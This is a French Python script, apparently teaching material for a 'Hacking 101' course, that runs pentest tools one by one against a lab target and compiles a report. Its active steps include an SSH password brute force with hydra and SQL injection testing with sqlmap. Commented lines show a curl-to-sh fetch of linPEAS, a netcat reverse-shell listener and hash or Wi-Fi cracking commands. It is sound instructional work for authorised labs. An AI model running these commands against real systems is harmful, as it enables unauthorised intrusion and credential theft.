#!/usr/bin/env python3
"""
Tisseur — cours Hacking 101

Tisse ensemble les outils des modules (Reconnaissance, Scanning,
Énumération, Exploitation, Outils Avancés) : il les exécute UN PAR
UN, en attendant que chaque étape soit complètement terminée avant
de passer à la suivante, puis tisse tous les résultats en un seul
rapport final (.md).

TROIS FAÇONS DE LE LANCER :
    python3 tisseur.py                          -> menu interactif (terminal)
    python3 tisseur.py --gui                    -> interface graphique (fenêtre)
    python3 tisseur.py --target <ip> [options]  -> mode direct (scripts/automatisation)

EXEMPLES (mode direct) :
    python3 tisseur.py --target 192.168.56.102
    python3 tisseur.py --target 192.168.56.102 --modules Reconnaissance,Scanning
    python3 tisseur.py --target 192.168.56.102 --url http://192.168.56.102:8080
    python3 tisseur.py --guide

L'interface graphique a besoin de Tkinter. Sur Kali, si c'est pas
déjà installé : sudo apt install python3-tk

⚠️ À utiliser seulement sur des machines que tu possèdes ou que t'as
le droit explicite de tester (ton lab Metasploitable2, etc.)
"""

import argparse
import subprocess
import sys
import datetime
import threading
import queue

# ============================================================
# BANNIÈRE ASCII (terminal) — figlet "slant", même rouge que le logo
# ============================================================
RESET = "\033[0m"
ROUGE = "\033[1;38;2;232;17;45m"   # #E8112D
ROUGE_HEX = "#E8112D"
NOIR_HEX = "#0a0a0a"

SIGNATURE = "Alex Marceau Prévost · Produit au Lac-Saint-Jean 🫐"

LOGO_TISSEUR = r"""
  ____________________ ________  ______
 /_  __/  _/ ___/ ___// ____/ / / / __ \
  / /  / / \__ \\__ \/ __/ / / / / /_/ /
 / / _/ / ___/ /__/ / /___/ /_/ / _, _/
/_/ /___//____/____/_____/\____/_/ |_|
"""


def print_banner():
    use_color = sys.stdout.isatty()
    lines = LOGO_TISSEUR.strip("\n").split("\n")
    width = max(len(l) for l in lines)

    for line in lines:
        print(f"{ROUGE}{line}{RESET}" if use_color else line)

    tagline = "— tisse tes commandes de pentest, une à la fois —"
    tagline = tagline.center(width)
    print(f"{ROUGE}{tagline}{RESET}" if use_color else tagline)

    signature = SIGNATURE.center(width)
    print(f"{ROUGE}{signature}{RESET}" if use_color else signature)
    print()


# ============================================================
# CONFIGURATION DES ÉTAPES
# (module, nom, commande) — {target} et {url} sont remplacés
# automatiquement. Une ligne commentée (#) = pas exécutée par
# défaut, parce qu'elle a besoin d'un setup différent (expliqué
# juste à côté). Décommente-la une fois ce setup fait.
# ============================================================
STEPS = [
    # ---------------- RECONNAISSANCE ----------------
    ("Reconnaissance", "Ping", "ping -c 4 {target}"),
    ("Reconnaissance", "Whois", "whois {target}"),
    # theHarvester sert à chercher des emails/sous-domaines d'un NOM DE
    # DOMAINE public (ex: exemple.com), pas d'une IP de lab privé :
    # ("Reconnaissance", "theHarvester", "theHarvester -d {target} -b all"),

    # ---------------- SCANNING ----------------
    ("Scanning", "Nmap - scan complet (ports + versions)", "nmap -sV -sC -p- {target}"),
    ("Scanning", "Masscan - scan rapide tous ports", "masscan -p1-65535 {target} --rate=1000"),
    # Legion = GUI qui automatise nmap + plein d'outils d'énumération
    # tout seul (fork de Sparta). C'est une interface graphique à part,
    # pas lançable en une ligne de commande comme les autres — tu le
    # démarres pis tu rentres l'IP dedans directement :
    #   legion

    # ---------------- ÉNUMÉRATION ----------------
    ("Énumération", "SMB enum", "enum4linux -a {target}"),
    ("Énumération", "Dossiers/fichiers web (gobuster)", "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt"),
    ("Énumération", "Scan vulnérabilités web (nikto)", "nikto -h {url}"),
    ("Énumération", "SNMP walk", "snmpwalk -v2c -c public {target}"),

    # ---------------- EXPLOITATION ----------------
    ("Exploitation", "Hydra - brute force SSH", "hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://{target}"),
    ("Exploitation", "sqlmap - test injection SQL", "sqlmap -u {url} --batch --banner"),
    # Metasploit s'automatise avec un "resource script" (.rc) préparé
    # d'avance — remplace mon_script.rc par le tien :
    # ("Exploitation", "Metasploit (resource script)", "msfconsole -q -r mon_script.rc"),
    # Burp Suite est surtout un outil interactif (proxy GUI) — pas
    # vraiment automatisable dans un pipeline CLI comme celui-ci.

    # ---------------- POST-EXPLOITATION ----------------
    # Ces étapes supposent que t'as DÉJÀ un accès/shell sur la machine
    # (donc après l'étape Exploitation, une fois dedans) — à rouler
    # manuellement dans ce shell, pas dans ce pipeline automatique :
    #   linPEAS (énum. de privilege escalation Linux, dans Metasploitable2) :
    #     curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
    #   netcat (reverse shell) : nc -lvnp 4444   (sur ta Kali, en écoute)
    #   Mimikatz : outil propre à Windows/Active Directory — ne s'applique
    #   pas à Metasploitable2, qui est du Linux.

    # ---------------- OUTILS AVANCÉS ----------------
    ("Outils avancés", "Capture réseau (tcpdump, 15s)", "timeout 15 tcpdump -i eth0 -w capture.pcap"),
    # John / Hashcat ont besoin d'un FICHIER DE HASH en entrée (pas
    # juste une IP) — à utiliser une fois que t'as récupéré des hash :
    # ("Outils avancés", "John the Ripper", "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"),
    # ("Outils avancés", "Hashcat", "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt"),
    # Aircrack-ng s'applique au WIFI (interface sans fil en mode
    # monitor), pas à une cible réseau filaire comme Metasploitable2 :
    # ("Outils avancés", "Aircrack-ng", "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap"),
    # Wifite = automatise les attaques wifi (WEP/WPA/WPS) en enchaînant
    # plusieurs outils (aircrack-ng, reaver, etc.) tout seul. Même chose
    # que Aircrack-ng : demande une interface wifi en mode monitor, pas
    # une IP — remplace {interface} par la tienne (ex: wlan0) :
    # ("Outils avancés", "Wifite", "wifite -i {interface} --kill"),
]


def run_step(module, name, cmd_template, target, url, report_lines, output=print):
    cmd = cmd_template.format(target=target, url=url)

    output(f"\n{'=' * 60}")
    output(f"[{module}] {name}")
    output(f"Commande : {cmd}")
    output(f"{'=' * 60}\n")

    report_lines.append(f"\n## [{module}] {name}\n")
    report_lines.append(f"Commande : `{cmd}`\n")
    report_lines.append("```")

    try:
        # subprocess.run() BLOQUE et attend que la commande soit
        # complètement terminée avant de rendre la main — c'est ça
        # qui garantit que les étapes se font une à la fois, en ordre.
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=600
        )
        out_text = (result.stdout or "") + (result.stderr or "")
        output(out_text)
        report_lines.append(out_text.strip())
    except subprocess.TimeoutExpired:
        msg = "⚠️ Étape interrompue (timeout de 10 minutes dépassé)"
        output(msg)
        report_lines.append(msg)
    except Exception as e:
        msg = f"⚠️ Erreur pendant cette étape : {e}"
        output(msg)
        report_lines.append(msg)

    report_lines.append("```")


def run_pipeline(target, url, modules_str, output=print):
    url = url or f"http://{target}"
    wanted_modules = [m.strip() for m in modules_str.split(",")] if modules_str else None

    steps_to_run = [s for s in STEPS if wanted_modules is None or s[0] in wanted_modules]

    if not steps_to_run:
        output("Aucune étape ne correspond aux modules demandés.")
        output("Modules disponibles : " + ", ".join(sorted(set(s[0] for s in STEPS))))
        return None

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_lines = [f"# Rapport Tisseur — Cible : {target}", f"Généré le {timestamp}\n"]

    output(f"🧵 Tisseur démarré sur la cible {target}")
    output(f"{len(steps_to_run)} étape(s) à exécuter, une par une.\n")

    for module, name, cmd_template in steps_to_run:
        run_step(module, name, cmd_template, target, url, report_lines, output=output)

    filename = (
        f"tisseur_rapport_{target.replace('.', '_')}_"
        f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
    )
    with open(filename, "w") as f:
        f.write("\n".join(report_lines))

    output(f"\n{'=' * 60}")
    output(f"✅ Tisseur terminé. Rapport sauvegardé : {filename}")
    output(f"{'=' * 60}")
    return filename


# ============================================================
# GUIDE — texte brut, utilisé par le terminal ET la fenêtre GUI
# ============================================================
def get_guide_text():
    modules_info = [
        ("Reconnaissance", "ping, whois"),
        ("Scanning", "nmap (scan complet), masscan (scan rapide)"),
        ("Énumération", "enum4linux, gobuster, nikto, snmpwalk"),
        ("Exploitation", "hydra (brute force SSH), sqlmap (injection SQL)"),
        ("Outils avancés", "tcpdump (capture réseau)"),
    ]
    lines = []
    lines.append("GUIDE — TISSEUR")
    lines.append("=" * 56)
    lines.append("")
    lines.append("COMMANDE DE BASE (mode direct) :")
    lines.append("  python3 tisseur.py --target <ip>")
    lines.append("")
    lines.append("MODULES :")
    for nom, outils in modules_info:
        lines.append(f"  {nom:<16} : {outils}")
    lines.append("  Sans sélection, les 5 modules roulent au complet.")
    lines.append("")
    lines.append("URL POUR LES OUTILS WEB :")
    lines.append("  Par défaut : http://<target>")
    lines.append("  Précise-la si ton appli web est sur un autre port")
    lines.append("  (ex: http://192.168.56.102:8080)")
    lines.append("")
    lines.append("ÉTAPES COMMENTÉES DANS LE CODE (désactivées par défaut) :")
    lines.append("  theHarvester, Legion, Metasploit, Burp Suite, linPEAS,")
    lines.append("  netcat, John the Ripper, Hashcat, Aircrack-ng, Wifite —")
    lines.append("  elles ont besoin d'un setup différent d'une simple IP")
    lines.append("  (hash, interface wifi, resource script...). Ouvre")
    lines.append("  tisseur.py, section STEPS, pour l'explication de chacune")
    lines.append("  et comment l'activer.")
    lines.append("")
    lines.append("⚠️  À utiliser seulement sur des machines que tu possèdes")
    lines.append("    ou que t'as le droit explicite de tester.")
    lines.append("")
    lines.append(SIGNATURE)
    return "\n".join(lines)


def show_guide_terminal():
    use_color = sys.stdout.isatty()
    for line in get_guide_text().split("\n"):
        print(f"{ROUGE}{line}{RESET}" if (use_color and line.startswith("GUIDE")) else line)
    print()


# ============================================================
# MENU INTERACTIF (terminal)
# ============================================================
def interactive_menu():
    print_banner()
    while True:
        print("1) Lancer le pipeline complet")
        print("2) Choisir des modules spécifiques")
        print("3) Interface graphique")
        print("4) Guide / Aide")
        print("5) Quitter")
        choix = input("\n> ").strip()

        if choix == "1":
            target = input("IP de la cible : ").strip()
            if target:
                run_pipeline(target, None, None)
            break
        elif choix == "2":
            target = input("IP de la cible : ").strip()
            mods = input("Modules (séparés par virgule, ex: Reconnaissance,Scanning) : ").strip()
            if target:
                run_pipeline(target, None, mods or None)
            break
        elif choix == "3":
            launch_gui()
            break
        elif choix == "4":
            show_guide_terminal()
        elif choix == "5":
            print("À la prochaine !")
            break
        else:
            print("Choix invalide, réessaie.\n")


# ============================================================
# INTERFACE GRAPHIQUE (Tkinter — tourne sur ton appareil, pas
# besoin du terminal une fois lancée)
# ============================================================
def launch_gui():
    try:
        import tkinter as tk
        from tkinter import scrolledtext, messagebox
    except ImportError:
        print("Tkinter n'est pas installé.")
        print("Sur Kali/Debian : sudo apt install python3-tk")
        sys.exit(1)

    class TisseurApp:
        def __init__(self, root):
            self.root = root
            root.title("Tisseur")
            root.configure(bg=NOIR_HEX)
            root.geometry("820x660")

            self.msg_queue = queue.Queue()

            tk.Label(
                root, text="TISSEUR", font=("Arial Black", 30, "bold"),
                fg=ROUGE_HEX, bg=NOIR_HEX,
            ).pack(pady=(14, 0))
            tk.Label(
                root, text="tisse tes commandes de pentest, une à la fois",
                font=("Arial", 10, "italic"), fg=ROUGE_HEX, bg=NOIR_HEX,
            ).pack(pady=(0, 0))
            tk.Label(
                root, text=SIGNATURE,
                font=("Arial", 9), fg=ROUGE_HEX, bg=NOIR_HEX,
            ).pack(pady=(0, 10))

            form = tk.Frame(root, bg=NOIR_HEX)
            form.pack(fill="x", padx=16)

            tk.Label(form, text="Cible (IP) :", fg="white", bg=NOIR_HEX).grid(row=0, column=0, sticky="w")
            self.target_var = tk.StringVar()
            target_entry = tk.Entry(form, textvariable=self.target_var, width=28)
            target_entry.grid(row=0, column=1, sticky="w", padx=8, pady=3)
            self._add_context_menu(target_entry)

            tk.Label(form, text="URL (optionnel) :", fg="white", bg=NOIR_HEX).grid(row=1, column=0, sticky="w")
            self.url_var = tk.StringVar()
            url_entry = tk.Entry(form, textvariable=self.url_var, width=28)
            url_entry.grid(row=1, column=1, sticky="w", padx=8, pady=3)
            self._add_context_menu(url_entry)

            mod_frame = tk.LabelFrame(root, text="Modules", fg="white", bg=NOIR_HEX, labelanchor="nw")
            mod_frame.pack(fill="x", padx=16, pady=8)

            self.module_vars = {}
            all_modules = sorted(set(s[0] for s in STEPS))
            for i, mod in enumerate(all_modules):
                var = tk.BooleanVar(value=True)
                tk.Checkbutton(
                    mod_frame, text=mod, variable=var, fg="white", bg=NOIR_HEX,
                    selectcolor="#1a1a1a", activebackground=NOIR_HEX, activeforeground="white",
                ).grid(row=0, column=i, padx=6, pady=4, sticky="w")
                self.module_vars[mod] = var

            btn_frame = tk.Frame(root, bg=NOIR_HEX)
            btn_frame.pack(fill="x", padx=16, pady=4)

            self.launch_btn = tk.Button(
                btn_frame, text="Lancer", command=self.launch,
                bg=ROUGE_HEX, fg="white", font=("Arial", 11, "bold"), relief="flat", padx=12,
            )
            self.launch_btn.pack(side="left")

            tk.Button(
                btn_frame, text="Guide", command=self.show_guide,
                bg="#1a1a1a", fg="white", relief="flat", padx=12,
            ).pack(side="left", padx=8)

            tk.Button(
                btn_frame, text="Copier le rapport", command=self.copy_output,
                bg="#1a1a1a", fg="white", relief="flat", padx=12,
            ).pack(side="left")

            self.output = scrolledtext.ScrolledText(
                root, bg=NOIR_HEX, fg="#e8e8e8", insertbackground="white", font=("Consolas", 10),
            )
            self.output.pack(fill="both", expand=True, padx=16, pady=(8, 16))
            self._add_context_menu(self.output)

            self.root.after(100, self.poll_queue)

        def _add_context_menu(self, widget):
            # Menu clic-droit + raccourcis clavier fiables (indépendants du
            # layout du clavier, contrairement aux bindings Ctrl par défaut).
            import tkinter as tk
            menu = tk.Menu(widget, tearoff=0)
            menu.add_command(label="Couper", command=lambda: widget.event_generate("<<Cut>>"))
            menu.add_command(label="Copier", command=lambda: widget.event_generate("<<Copy>>"))
            menu.add_command(label="Coller", command=lambda: widget.event_generate("<<Paste>>"))
            menu.add_separator()
            menu.add_command(label="Tout sélectionner",
                             command=lambda: self._select_all(widget))

            def popup(event):
                widget.focus_set()
                menu.tk_popup(event.x_root, event.y_root)

            widget.bind("<Button-3>", popup)   # clic droit (Windows/Linux)
            widget.bind("<Button-2>", popup)   # clic droit (macOS)
            widget.bind("<Control-a>", lambda e: (self._select_all(widget), "break")[1])
            widget.bind("<Control-A>", lambda e: (self._select_all(widget), "break")[1])

        @staticmethod
        def _select_all(widget):
            try:
                if isinstance(widget, scrolledtext.ScrolledText):
                    widget.tag_add("sel", "1.0", "end-1c")
                else:
                    widget.select_range(0, "end")
                    widget.icursor("end")
            except Exception:
                pass

        def copy_output(self):
            text = self.output.get("1.0", "end-1c")
            self.root.clipboard_clear()
            self.root.clipboard_append(text)

        def log(self, text):
            self.msg_queue.put(text)

        def poll_queue(self):
            try:
                while True:
                    line = self.msg_queue.get_nowait()
                    self.output.insert("end", str(line) + "\n")
                    self.output.see("end")
            except queue.Empty:
                pass
            self.root.after(100, self.poll_queue)

        def show_guide(self):
            win = tk.Toplevel(self.root)
            win.title("Guide — Tisseur")
            win.configure(bg=NOIR_HEX)
            win.geometry("620x480")
            txt = scrolledtext.ScrolledText(win, bg=NOIR_HEX, fg="white", font=("Consolas", 10))
            txt.pack(fill="both", expand=True, padx=10, pady=10)
            txt.insert("end", get_guide_text())
            txt.config(state="disabled")

        def launch(self):
            target = self.target_var.get().strip()
            if not target:
                messagebox.showwarning("Tisseur", "Entre une IP de cible.")
                return
            url = self.url_var.get().strip() or None
            selected = [m for m, v in self.module_vars.items() if v.get()]
            if not selected:
                messagebox.showwarning("Tisseur", "Sélectionne au moins un module.")
                return
            modules_str = ",".join(selected)

            self.launch_btn.config(state="disabled")
            self.output.delete("1.0", "end")

            threading.Thread(target=self._run, args=(target, url, modules_str), daemon=True).start()

        def _run(self, target, url, modules_str):
            run_pipeline(target, url, modules_str, output=self.log)
            self.root.after(0, lambda: self.launch_btn.config(state="normal"))

    root = tk.Tk()
    TisseurApp(root)
    root.mainloop()


def main():
    # Pas d'arguments -> menu interactif dans le terminal (avec accès à la GUI dedans).
    # --gui -> ouvre direct la fenêtre.
    # --target ... -> mode direct, pour scripts/automatisation.
    if len(sys.argv) == 1:
        interactive_menu()
        return

    if "--gui" in sys.argv:
        launch_gui()
        return

    if "--guide" in sys.argv:
        print_banner()
        show_guide_terminal()
        return

    parser = argparse.ArgumentParser(description="Tisseur — pipeline de pentest, Hacking 101")
    parser.add_argument("--target", required=True, help="IP ou host de la cible")
    parser.add_argument("--url", default=None, help="URL pour les outils web (défaut: http://<target>)")
    parser.add_argument("--modules", default=None,
                         help="Liste de modules séparés par virgule (défaut: tous). "
                              "Ex: Reconnaissance,Scanning")
    parser.add_argument("--guide", action="store_true", help="Affiche le guide puis quitte")
    args = parser.parse_args()

    print_banner()

    run_pipeline(args.target, args.url, args.modules)


if __name__ == "__main__":
    main()
